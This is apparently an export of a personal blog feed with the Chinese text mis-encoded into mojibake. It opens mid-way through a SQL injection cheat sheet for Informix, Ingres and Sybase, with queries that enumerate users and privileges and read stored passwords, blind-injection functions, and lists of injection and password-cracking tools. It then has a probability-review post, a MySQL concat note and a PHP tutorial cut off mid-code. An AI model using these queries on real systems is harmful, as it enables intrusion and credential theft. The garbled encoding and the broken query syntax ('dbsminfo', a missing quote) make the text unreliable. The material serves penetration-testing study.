è¯¢</th></tr></thead><tbody><tr><td>å­—ç¬¦ä¸²é•¿åº¦</td><td><code>LENGTH()</code></td></tr><tr><td>ä»ç»™å®šå­—ç¬¦ä¸²ä¸­æå–å­ä¸²</td><td><code>SELECT SUBSTRING('ABCD' FROM 4 FOR 1) FROM  systables where tabid = 1;  --è¿”å›'D';</code></td></tr><tr><td>å­—ç¬¦ä¸²(â€˜ABCâ€™)ä¸å¸¦å•å¼•å·çš„è¡¨ç¤ºæ–¹å¼</td><td>`SELECT CHR(65)</td></tr></tbody></table><h4 id="Ingres-å¤‡å¿˜å•"><a href="#Ingres-å¤‡å¿˜å•" class="headerlink" title="Ingres å¤‡å¿˜å•"></a>Ingres å¤‡å¿˜å•</h4><p>Ingresæ˜¯ä¸€ç§å¯ä»¥åœ¨æ‰€æœ‰ä¸»æµæ“ä½œç³»ç»Ÿä¸Šä½¿ç”¨çš„å¼€æºæ•°æ®åº“ã€‚</p><ol><li>æšä¸¾æ•°æ®åº“é…ç½®ä¿¡æ¯å’Œæ¨¡å¼</li></ol><p>æå–Ingresæ•°æ®åº“çš„é…ç½®ä¿¡æ¯</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥   è¯¢</th></tr></thead><tbody><tr><td>ç‰ˆæœ¬</td><td><code>SELECT dbsminfo('version');</code></td></tr><tr><td>å½“å‰ç”¨æˆ·</td><td><code>SELECT dbsminfo('system user');</code><br><code> SELECT dbsminfo('session user');</code></td></tr><tr><td>åˆ—å‡ºç”¨æˆ·</td><td><code>SELECT name, password FROM iiuser;</code></td></tr><tr><td>å½“å‰ç”¨æˆ·æƒé™</td><td><code>SELECT dbsminfo('select_syscat');</code><br><code>SELECT dbsminfo('db_privileges');</code><br><code>SELECT  dbsminfo('current_priv_mask'); </code><br><code>SELECT dbsminfo('db_admin');</code><br><code>SELECT dbsminfo('security_priv');</code><br><code>SELECT dbsminfo('create_table'); </code><br><code>SELECT dbsminfo('create procedure');</code></td></tr></tbody></table><p> æå–Ingresæ•°æ®åº“çš„æ¨¡å¼ä¿¡æ¯</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥   è¯¢</th></tr></thead><tbody><tr><td>å½“å‰æ•°æ®åº“</td><td><code>SELECT dbmsinfo(database');</code></td></tr><tr><td>åˆ—å‡ºè¡¨</td><td><code>SELECT relid, relowner, relloc FROM iirelation WHERE relowner != '$ingres';</code></td></tr><tr><td>åˆ—å‡ºåˆ—</td><td><code>SELECT column_name, column_datatype,  table_name, table_owner FROM iicolumns;</code></td></tr></tbody></table><ol start="2"><li>SQLç›²æ³¨å‡½æ•°ï¼šIngres</li></ol><p>SQLç›²æ³¨å‡½æ•°</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥   è¯¢</th></tr></thead><tbody><tr><td>å­—ç¬¦ä¸²é•¿åº¦</td><td><code>LENGTH()</code></td></tr><tr><td>ä»ç»™å®šå­—ç¬¦ä¸²ä¸­æå–å­ä¸²</td><td><code>SELECT substr(string, offset, length); -- </code></td></tr><tr><td>å­—ç¬¦ä¸²(â€˜ABCâ€™)ä¸å¸¦å•å¼•å·çš„è¡¨ç¤ºæ–¹å¼</td><td>`SELECT chr(65)</td></tr></tbody></table><h4 id="Sybase-å¤‡å¿˜å•"><a href="#Sybase-å¤‡å¿˜å•" class="headerlink" title="Sybase å¤‡å¿˜å•"></a>Sybase å¤‡å¿˜å•</h4><p>Sybaseä¸Microsoft SQL Serverå…±äº«äº†å…±åŒçš„é—äº§ï¼Œåœ¨Microsoft SQL Serverä¸­ä½¿ç”¨çš„å¾ˆå¤š æ–¹æ³•å¯¹äºSybaseåŒæ ·æœ‰æ•ˆï¼Œå¾€å¾€åªé¡»åœ¨æ‰€ç”¨å‘½ä»¤çš„è¯­æ³•ä¸Šç¨åŠ ä¿®æ”¹å³å¯ã€‚</p><ol><li>æšä¸¾æ•°æ®åº“é…ç½®ä¿¡æ¯å’Œæ¨¡å¼</li></ol><p>æå–Sybaseæ•°æ®åº“çš„é…ç½®ä¿¡æ¯</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>æ•°   æ®</td><td>æŸ¥   è¯¢</td></tr><tr><td>ç‰ˆæœ¬</td><td><code>SELECT @@version;</code></td></tr><tr><td>å½“å‰ç”¨æˆ·</td><td><code>SELECT username();</code><br><code> SELECT suser_name();</code><br><code> SELECT user;</code></td></tr><tr><td>åˆ—å‡ºç”¨æˆ·</td><td><code>SELECT name FROM master..syslogins;</code></td></tr><tr><td>å½“å‰ç”¨æˆ·æƒé™</td><td><code>SELECT show role(); </code><br><code> EXEC sp_helprotect &lt;user&gt;;</code></td></tr></tbody></table><p>æå–Sybaseæ•°æ®åº“çš„æ¨¡å¼ä¿¡æ¯</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥   è¯¢</th></tr></thead><tbody><tr><td>å½“å‰æ•°æ®åº“</td><td><code>SELECT db_name();</code></td></tr><tr><td>åˆ—å‡ºæ•°æ®åº“</td><td><code>SELECT name FROM master..sysdatabases;</code></td></tr><tr><td>åˆ—å‡ºè¡¨</td><td>åˆ—å‡ºå½“å‰æ•°æ®åº“ä¸­çš„è¡¨ï¼š <br><code>SELECT name FROM sysobjects WHERE type='U'; </code><br><code>SELECT name FROM sysobjects WHERE type='V'-- è§†å›¾ </code><br>åˆ—å‡ºmasteræ•°æ®åº“ä¸­çš„è¡¨ï¼š <br><code>SELECT name FROM master..sysobjects WHERE type= 'U';</code><br><code>SELECT name FROM  master..sysobjects WHERE type='V';</code></td></tr><tr><td>åˆ—å‡ºåˆ—</td><td>åˆ—å‡ºå½“å‰æ•°æ®åº“ä¸­tblUsersè¡¨çš„å„ä¸ªåˆ—çš„åç§°ï¼š<br><code>SELECT name FROM syscolumns WHERE  id=object_ id('tblUsers');</code><br>  åˆ—å‡ºadminæ•°æ®åº“ä¸­tblUsersè¡¨çš„å„ä¸ªåˆ—çš„åç§°ï¼š<br><code>  SELECT  name FROM admin..syscolumns WHERE id=object_id('admin..tblUsers');</code></td></tr></tbody></table><ol start="2"><li>SQLç›²æ³¨å‡½æ•°ï¼šSybase</li></ol><p>SQLç›²æ³¨å‡½æ•°</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥   è¯¢</th></tr></thead><tbody><tr><td>å­—ç¬¦ä¸²é•¿åº¦</td><td><code>LEN();</code></td></tr><tr><td>ä»ç»™å®šå­—ç¬¦ä¸²ä¸­æå–å­ä¸²</td><td><code>SUBSTRING(string,offset,length);</code></td></tr><tr><td>å­—ç¬¦ä¸²(â€˜ABCâ€™)ä¸å¸¦å•å¼•å·çš„è¡¨ç¤ºæ–¹å¼</td><td><code>SELECT char(65)+char(66)+char(67);</code></td></tr></tbody></table><h4 id="Microsoft-Access"><a href="#Microsoft-Access" class="headerlink" title="Microsoft Access"></a>Microsoft Access</h4><p>Microsoft Accessæ•°æ®åº“æ— æ³•å¾ˆå¥½åœ°é€‚åº”ä¼ä¸šçº§åº”ç”¨ï¼Œæ‰€ä»¥é€šå¸¸åªåœ¨å…·æœ‰æå°æ•°æ®åº“éœ€æ±‚ çš„åº”ç”¨ä¸­æ‰ä¼šé‡åˆ°ã€‚</p><h3 id="èµ„æº"><a href="#èµ„æº" class="headerlink" title="èµ„æº"></a>èµ„æº</h3><h4 id="SQLæ³¨å…¥ç™½çš®ä¹¦"><a href="#SQLæ³¨å…¥ç™½çš®ä¹¦" class="headerlink" title="SQLæ³¨å…¥ç™½çš®ä¹¦"></a>SQLæ³¨å…¥ç™½çš®ä¹¦</h4><ul><li>Victor Chapela æ’°å†™çš„ â€œAdvanced SQL Injectionâ€ : <a href="www.owasp.org/index.php/Image:Advanced_SQL_Injection.ppt">www.owasp.org/index.php/Image:Advanced_SQL_Injection.ppt</a></li><li>Chris Anleyæ’°å†™çš„â€Advanced SQL Injection in SQL Server Applicationsâ€ï¼š<a href="http://www.ngssoftware.com/papers/advanced_sql_injection.pdf">www.ngssoftware.com/papers/advanced_sql_injection.pdf</a></li><li>Gary Oâ€™Leary-Steeleæ’°å†™çš„â€Buffer Truncation Abuse in.NET and Microsoft SQL<br>Serverâ€ï¼š<a href="http://scanner.sec-1.com/resources/bta.pdf">http://scanner.sec-1.com/resources/bta.pdf</a></li><li>Brett Mooreæ’°å†™çš„â€Access through Accessâ€ï¼š<a href="http://www.insomniasec.com/publications/Access-Through-Access.pdf">www.insomniasec.com/publications/Access-Through-Access.pdf</a></li><li>Chema Alonsoæ’°å†™çš„â€Time-Based Blind SQL Injection with Heavy Queriesâ€ï¼š<a href="http://technet.microsoft.com/en-us/library/cc512676.aspx">http://technet.microsoft.com/en-us/library/cc512676.aspx</a></li></ul><h4 id="SQLæ³¨å…¥å¤‡å¿˜å•"><a href="#SQLæ³¨å…¥å¤‡å¿˜å•" class="headerlink" title="SQLæ³¨å…¥å¤‡å¿˜å•"></a>SQLæ³¨å…¥å¤‡å¿˜å•</h4><ul><li><p>PentestMonkey.com é’ˆå¯¹ Oracleã€Microsoft SQL Serverã€MySQLã€PostgreSQLã€Ingresã€DB2 å’Œ Informix çš„ SQL æ³¨å…¥å¤‡å¿˜å•ï¼š<a href="http://pentestmonkey.net/cheat-sheets/">http://pentestmonkey.net/cheat-sheets/</a> </p></li><li><p>Michaeldaw.org é’ˆå¯¹ Sybaseã€MySQLã€OraclePostgreSQLã€DB2 å’Œ Ingres çš„ SQL æ³¨ å…¥å¤‡å¿˜å•ï¼š<a href="http://michaeldaw.org/sql-injection-cheat-sheet/">http://michaeldaw.org/sql-injection-cheat-sheet/</a></p></li><li><p>Ferruh Mavituna é’ˆå¯¹ MySQLã€SQL Serverã€PostgreSQL å’Œ Oracle çš„ SQL æ³¨å…¥å¤‡å¿˜å•ï¼š <a href="http://ferruh.mavituna.com/sql-injection-cheatssheet-oku/">http://ferruh.mavituna.com/sql-injection-cheatssheet-oku/</a></p></li><li><p>Ferruh Mavituna é’ˆå¯¹ Oracle çš„ SQL æ³¨å…¥å¤‡å¿˜å•ï¼š<a href="http://ferruh.mavituna.com/oracle-injection-cheat-sheet-oku/">http://ferruh.mavituna.com/oracle-injection-cheat-sheet-oku/</a></p></li></ul><h4 id="SQLæ³¨å…¥åˆ©ç”¨å·¥å…·"><a href="#SQLæ³¨å…¥åˆ©ç”¨å·¥å…·" class="headerlink" title="SQLæ³¨å…¥åˆ©ç”¨å·¥å…·"></a>SQLæ³¨å…¥åˆ©ç”¨å·¥å…·</h4><ul><li><p>Absinthe æ˜¯ä¸€æ¬¾åŸºäº Windows GUI çš„åˆ©ç”¨å·¥å…·ï¼Œæ”¯æŒ Microsoft SQL Serverã€Oracleã€PostgreSQL å’Œ Sybaseï¼Œå¹¶ä½¿ç”¨ SQL ç›²æ³¨å’ŒåŸºäºé”™è¯¯çš„ SQL æ³¨å…¥ï¼š<a href="http://www.0x90.org/releases/absinthe/">www.0x90.org/releases/absinthe/</a></p></li><li><p>SQLBruteæ˜¯ä¸€æ¬¾åŸºäºæ—¶é—´å’Œé”™è¯¯çš„SQLç›²æ³¨å·¥å…·ï¼Œæ”¯æŒMicrosoft SQL Serverå’ŒOracleï¼š <a href="https://github.com/GDSSecurity/SQLBruteo">https://github.com/GDSSecurity/SQLBruteo</a></p></li><li><p>Bobcat æ˜¯ä¸€æ¬¾åŸºäº Windows GUI çš„å·¥å…·ï¼Œæ”¯æŒ Microsoft SQL Server æ¼æ´åˆ©ç”¨ï¼š<a href="http://web.mac.com/nmonkee/pub/bobcat.html">http://web.mac.com/nmonkee/pub/bobcat.html</a> </p></li><li><p>BSQL Hackeråœ¨SQLæ³¨å…¥åˆ©ç”¨é¢†åŸŸæ˜¯ä¸€æ¬¾ç›¸å¯¹è¾ƒæ–°çš„å·¥å…·ã€‚æ˜¯ä¸€ç§åŸºäºWindowsçš„GUI åº”ç”¨ç¨‹åºï¼Œæ”¯æŒMicrosoft SQL Serverã€Oracleå’ŒMySQL,å¹¶æ”¯æŒSQLç›²æ³¨å’ŒåŸºäºé”™è¯¯çš„ SQL æ³¨å…¥æŠ€æœ¯ï¼š<a href="http://labs.portcullis.co.uk/application/bsql-hacker/">http://labs.portcullis.co.uk/application/bsql-hacker/</a></p></li><li><p>å¾ˆå¤šæ”»å‡»è€…è®¤ä¸ºSQLMapæ˜¯ç›®å‰æœ€å¥½çš„SQLæ³¨å…¥æ¼æ´åˆ©ç”¨å·¥å…·ï¼š<a href="http://sqlmap.source-fbrge.net/">http://sqlmap.source- fbrge.net/</a></p></li><li><p>Sqlninjaæ˜¯ä¸€æ¬¾ä½¿ç”¨Perlç¼–å†™çš„ä¸”å…³æ³¨è·å–ä»£ç æ‰§è¡Œçš„Microsoft SQLæ³¨å…¥å·¥å…·ï¼š<a href="http://sqlninja.sourceforge.net/">http://sqlninja.sourceforge.net/</a></p></li><li><p>Squeezaè¢«ä½œä¸ºBlackHatå±•ç¤ºçš„ä¸€éƒ¨åˆ†å‘å¸ƒã€‚å®ƒå…³æ³¨çš„æ˜¯å¯é€‰çš„é€šä¿¡é€šé“ï¼Œæ”¯æŒMicrosoft SQL Serverï¼š <a href="http://www.sensepost.com/research/squeezao">www.sensepost.com/research/squeezao</a></p></li></ul><h4 id="å£ä»¤ç ´è§£å·¥å…·"><a href="#å£ä»¤ç ´è§£å·¥å…·" class="headerlink" title="å£ä»¤ç ´è§£å·¥å…·"></a>å£ä»¤ç ´è§£å·¥å…·</h4><ul><li><p>Cain &amp; Abelï¼š <a href="http://www.oxid.it/">www.oxid.it</a></p></li><li><p>Woraauthbfï¼š <a href="http://www.soonerorlater.hu/index.khtml?article_id=513">www.soonerorlater.hu/index.khtml?article_id=513</a></p></li><li><p>Checkpwd: <a href="http://www.red-database-security.com/software/checkpwd.html">www.red-database-security.com/software/checkpwd.html</a></p></li><li><p>John the Ripperï¼š <a href="http://www.openwall.com/john/">www.openwall.com/john/</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
            <tag> å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¦‚ç‡è®ºå¤ä¹ </title>
      <link href="/2021/06/06/gailvlun/"/>
      <url>/2021/06/06/gailvlun/</url>
      
        <content type="html"><![CDATA[<img src="/.io//06/06/gailvlun/image-20210605145107900.png" class="" title="image-20210605145107900"><img src="/.io//06/06/gailvlun/image-20210605145032945.png" class="" title="image-20210605145032945"><img src="/.io//06/06/gailvlun/image-20210605145203400.png" class="" title="image-20210605145203400"><img src="/.io//06/06/gailvlun/image-20210605145230834.png" class="" title="image-20210605145230834"><img src="/.io//06/06/gailvlun/image-20210605145259602.png" class="" title="image-20210605145259602"><img src="/.io//06/06/gailvlun/image-20210605141421676.png" class="" title="image-20210605141421676"><img src="/.io//06/06/gailvlun/image-20210605141508158.png" class="" title="image-20210605141508158"><img src="/.io//06/06/gailvlun/image-20210605141659654.png" class="" title="image-20210605141659654"><img src="/.io//06/06/gailvlun/image-20210605141548849.png" class="" title="image-20210605141548849"><img src="/.io//06/06/gailvlun/image-20210605141754051.png" class="" title="image-20210605141754051"><img src="/.io//06/06/gailvlun/image-20210605141913183.png" class="" title="image-20210605141913183"><img src="/.io//06/06/gailvlun/image-20210605142008135.png" class="" title="image-20210605142008135"><img src="/.io//06/06/gailvlun/image-20210605142257167.png" class="" title="image-20210605142257167">  <img src="/.io//06/06/gailvlun/image-20210605142345424.png" class="" title="image-20210605142345424"><img src="/.io//06/06/gailvlun/image-20210605142801766.png" class="" title="image-20210605142801766"><img src="/.io//06/06/gailvlun/image-20210605142840333.png" class="" title="image-20210605142840333"><img src="/.io//06/06/gailvlun/image-20210605142927152.png" class="" title="image-20210605142927152"><img src="/.io//06/06/gailvlun/image-20210605143103403.png" class="" title="image-20210605143103403"><img src="/.io//06/06/gailvlun/image-20210605143343113.png" class="" title="image-20210605143343113"><img src="/.io//06/06/gailvlun/image-20210605143513931.png" class="" title="image-20210605143513931"><img src="/.io//06/06/gailvlun/image-20210605143733628.png" class="" title="image-20210605143733628"><img src="/.io//06/06/gailvlun/image-20210605143904143.png" class="" title="image-20210605143904143"><img src="/.io//06/06/gailvlun/image-20210605144052735.png" class="" title="image-20210605144052735"><img src="/.io//06/06/gailvlun/image-20210605144233195.png" class="" title="image-20210605144233195"><img src="/.io//06/06/gailvlun/image-20210605144427071.png" class="" title="image-20210605144427071"><img src="/.io//06/06/gailvlun/image-20210605144620335.png" class="" title="image-20210605144620335"><img src="/.io//06/06/gailvlun/image-20210605144918602.png" class="" title="image-20210605144918602"><img src="/.io//06/06/gailvlun/image-20210605144939856.png" class="" title="image-20210605144939856"><img src="/.io//06/06/gailvlun/image-20210605151627463.png" class="" title="image-20210605151627463"><img src="/.io//06/06/gailvlun/image-20210605151711739.png" class="" title="image-20210605151711739"><img src="/.io//06/06/gailvlun/image-20210605151848511.png" class="" title="image-20210605151848511"><img src="/.io//06/06/gailvlun/image-20210605151957227.png" class="" title="image-20210605151957227"><img src="/.io//06/06/gailvlun/image-20210605152148901.png" class="" title="image-20210605152148901"><img src="/.io//06/06/gailvlun/image-20210605152658749.png" class="" title="image-20210605152658749"><img src="/.io//06/06/gailvlun/image-20210605152846514.png" class="" title="image-20210605152846514"><img src="/.io//06/06/gailvlun/image-20210605153248570.png" class="" title="image-20210605153248570"><img src="/.io//06/06/gailvlun/image-20210605153549745.png" class="" title="image-20210605153549745"><img src="/.io//06/06/gailvlun/image-20210605153723252.png" class="" title="image-20210605153723252"><img src="/.io//06/06/gailvlun/image-20210605153753434.png" class="" title="image-20210605153753434"><img src="/.io//06/06/gailvlun/image-20210605153948101.png" class="" title="image-20210605153948101"><img src="/.io//06/06/gailvlun/image-20210605154136376.png" class="" title="image-20210605154136376"><img src="/.io//06/06/gailvlun/image-20210605154454662.png" class="" title="image-20210605154454662"><img src="/.io//06/06/gailvlun/image-20210605154558264.png" class="" title="image-20210605154558264"><img src="/.io//06/06/gailvlun/image-20210605214436459.png" class="" title="image-20210605214436459"><img src="/.io//06/06/gailvlun/image-20210605214541503.png" class="" title="image-20210605214541503"><img src="/.io//06/06/gailvlun/image-20210605214749022.png" class="" title="image-20210605214749022"><img src="/.io//06/06/gailvlun/image-20210605214823914.png" class="" title="image-20210605214823914"><img src="/.io//06/06/gailvlun/image-20210605215147862.png" class="" title="image-20210605215147862"><img src="/.io//06/06/gailvlun/image-20210605215313664.png" class="" title="image-20210605215313664"><img src="/.io//06/06/gailvlun/image-20210605215410937.png" class="" title="image-20210605215410937"><img src="/.io//06/06/gailvlun/image-20210605215451785.png" class="" title="image-20210605215451785"><img src="/.io//06/06/gailvlun/image-20210605215637916.png" class="" title="image-20210605215637916"><img src="/.io//06/06/gailvlun/image-20210605215738708.png" class="" title="image-20210605215738708"><img src="/.io//06/06/gailvlun/image-20210605220007242.png" class="" title="image-20210605220007242"><img src="/.io//06/06/gailvlun/image-20210605220223548.png" class="" title="image-20210605220223548"><img src="/.io//06/06/gailvlun/image-20210605220448263.png" class="" title="image-20210605220448263"><img src="/.io//06/06/gailvlun/image-20210605220534601.png" class="" title="image-20210605220534601"><img src="/.io//06/06/gailvlun/image-20210605220640151.png" class="" title="image-20210605220640151"><img src="/.io//06/06/gailvlun/image-20210605220813441.png" class="" title="image-20210605220813441"><img src="/.io//06/06/gailvlun/image-20210605220956826.png" class="" title="image-20210605220956826"><img src="/.io//06/06/gailvlun/image-20210605232951954.png" class="" title="image-20210605232951954"><img src="/.io//06/06/gailvlun/image-20210605233155732.png" class="" title="image-20210605233155732"><img src="/.io//06/06/gailvlun/image-20210605233416112.png" class="" title="image-20210605233416112"><img src="/.io//06/06/gailvlun/image-20210605233647177.png" class="" title="image-20210605233647177"><img src="/.io//06/06/gailvlun/image-20210605233942148.png" class="" title="image-20210605233942148"><img src="/.io//06/06/gailvlun/image-20210605234037479.png" class="" title="image-20210605234037479"> <img src="/.io//06/06/gailvlun/image-20210605234307183.png" class="" title="image-20210605234307183"><img src="/.io//06/06/gailvlun/image-20210605234418776.png" class="" title="image-20210605234418776">]]></content>
      
      
      <categories>
          
          <category> è¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysqlä¸­çš„å­—ç¬¦è¿æ¥</title>
      <link href="/2021/06/01/mysql-zhong-de-zi-fu-lian-jie/"/>
      <url>/2021/06/01/mysql-zhong-de-zi-fu-lian-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="mysqlä¸­çš„å­—ç¬¦è¿æ¥"><a href="#mysqlä¸­çš„å­—ç¬¦è¿æ¥" class="headerlink" title="mysqlä¸­çš„å­—ç¬¦è¿æ¥"></a>mysqlä¸­çš„å­—ç¬¦è¿æ¥</h2><h3 id="ä¸¤ä¸ªå­—ç¬¦è¿æ¥å‡½æ•°"><a href="#ä¸¤ä¸ªå­—ç¬¦è¿æ¥å‡½æ•°" class="headerlink" title="ä¸¤ä¸ªå­—ç¬¦è¿æ¥å‡½æ•°"></a>ä¸¤ä¸ªå­—ç¬¦è¿æ¥å‡½æ•°</h3><ul><li><p>concat</p><p>æ”¯ä»˜ä¸²å’Œæ”¯ä»˜ä¸²è¿æ¥ï¼Œæ•°å­—å’Œå­—ç¬¦ä¸²è¿æ¥ï¼Œæ•°å­—å’Œæ•°å­—è¿æ¥</p><p>ç”¨æ³•ï¼š<code>concat(string1,string2,â€¦â€¦)</code></p><p><img src="https://z3.ax1x.com/2021/06/01/2KQ7Yn.png" alt="2KQ7Yn.png"></p></li><li><p>concat_ws</p><p>å…¶å®å’Œconcatä¸€ä¸ªæ„æ€</p><p>ç”¨æ³•ï¼š<code>concat_ws(åˆ†éš”ç¬¦,string1,string2,â€¦â€¦)</code></p><p><img src="https://z3.ax1x.com/2021/06/01/2KQxw4.png" alt="2KQxw4.png"></p></li></ul><h3 id="ç©ºæ ¼è¿æ¥"><a href="#ç©ºæ ¼è¿æ¥" class="headerlink" title="ç©ºæ ¼è¿æ¥"></a>ç©ºæ ¼è¿æ¥</h3><p>å¦‚å›¾è¿æ¥æ–¹å¼ï¼Œå­—ç¬¦ä¸²å’Œå­—ç¬¦ä¸²ï¼Œå…¶ä»–éƒ½ä¸è¡Œ</p><p>å‡½æ•°ä¸èƒ½ä»¥ç©ºæ ¼è¿æ¥ä»»æ„æ•°æ®ç±»å‹ï¼Œåœ¨å…¶ä»–å‡½æ•°ä¸­å¯ä»¥ä½¿ç”¨</p><p><img src="https://z3.ax1x.com/2021/06/01/2KlVmD.png" alt="2KlVmD.png"></p><p><img src="https://z3.ax1x.com/2021/06/01/2Kll1P.png" alt="2Kll1P.png"></p><p>å‡½æ•°å¯ä»¥</p><h3 id="å®é™…åˆ†æ"><a href="#å®é™…åˆ†æ" class="headerlink" title="å®é™…åˆ†æ"></a>å®é™…åˆ†æ</h3><p><img src="https://z3.ax1x.com/2021/06/01/2KlNkj.png" alt="2KlNkj.png"></p><p>å¯ä»¥çœ‹åˆ°å‡½æ•°åœ¨å•å¼•å·å’ŒåŒå¼•å·ä¸­éƒ½æ‰§è¡Œä¸äº†ï¼Œä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›</p><h3 id="æ‹“å±•"><a href="#æ‹“å±•" class="headerlink" title="æ‹“å±•"></a>æ‹“å±•</h3><p><code>group_concat</code></p><p>ç”¨æ³•ï¼š<code>group_concat(åˆ—åï¼Œåˆ†éš”ç¬¦)</code>åˆ†éš”ç¬¦å¯é€‰ï¼Œä¸ºç©ºåˆ™ä¸ºé€—å·</p><p>ä½œç”¨ï¼šå°†ä¸€åˆ—æ‰€æœ‰çš„å€¼æ‰“å°å‡ºæ¥</p><p><img src="https://z3.ax1x.com/2021/06/01/2KlsnU.png" alt="2KlsnU.png"></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpå¤ä¹ </title>
      <link href="/2021/05/27/phps-study/"/>
      <url>/2021/05/27/phps-study/</url>
      
        <content type="html"><![CDATA[<h1 id="php-study"><a href="#php-study" class="headerlink" title="php_study"></a>php_study</h1><h3 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//å•è¡Œæ³¨é‡Š</span><span class="token comment">/*å¤šè¡Œæ³¨é‡Š*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/*å˜é‡ä»¥ $ ç¬¦å·å¼€å§‹ï¼Œåé¢è·Ÿç€å˜é‡çš„åç§°å˜é‡åå¿…é¡»ä»¥å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿å­—ç¬¦å¼€å§‹å˜é‡ååªèƒ½åŒ…å«å­—æ¯æ•°å­—å­—ç¬¦ä»¥åŠä¸‹åˆ’çº¿ï¼ˆA-zã€0-9 å’Œ _ ï¼‰å˜é‡åä¸èƒ½åŒ…å«ç©ºæ ¼å˜é‡åæ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼ˆ$y å’Œ $Y æ˜¯ä¸¤ä¸ªä¸åŒçš„å˜é‡ï¼‰*/</span><span class="token comment">//å£°æ˜</span><span class="token variable">$var</span><span class="token operator">=</span><span class="token string double-quoted-string">"hello"</span><span class="token punctuation">;</span><span class="token variable">$var1</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment">// å…¨å±€å˜é‡</span><span class="token variable">$y</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$y</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment">// å±€éƒ¨å˜é‡</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p&gt;æµ‹è¯•å‡½æ•°å†…å˜é‡:&lt;p&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"å˜é‡ x ä¸º: <span class="token interpolation"><span class="token variable">$x</span></span>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"å˜é‡ y ä¸º: <span class="token interpolation"><span class="token variable">$y</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">yourTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$x</span><span class="token punctuation">,</span><span class="token variable">$y</span><span class="token punctuation">;</span>    <span class="token variable">$y</span><span class="token operator">=</span><span class="token variable">$x</span><span class="token operator">+</span><span class="token variable">$y</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">testest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token comment">//è¯¥å˜é‡ä¼šä¿ç•™ä¸Šæ¬¡è°ƒç”¨å‡½æ•°äº§ç”Ÿçš„å€¼</span><span class="token punctuation">}</span><span class="token function">testest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p&gt;æµ‹è¯•å‡½æ•°å¤–å˜é‡:&lt;p&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"å˜é‡ x ä¸º: <span class="token interpolation"><span class="token variable">$x</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"å˜é‡ y ä¸º: <span class="token interpolation"><span class="token variable">$y</span></span>"</span><span class="token punctuation">;</span><span class="token function">yourTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p&gt;æµ‹è¯•å‡½æ•°å¤–å˜é‡:&lt;p&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"å˜é‡ x ä¸º: <span class="token interpolation"><span class="token variable">$x</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token 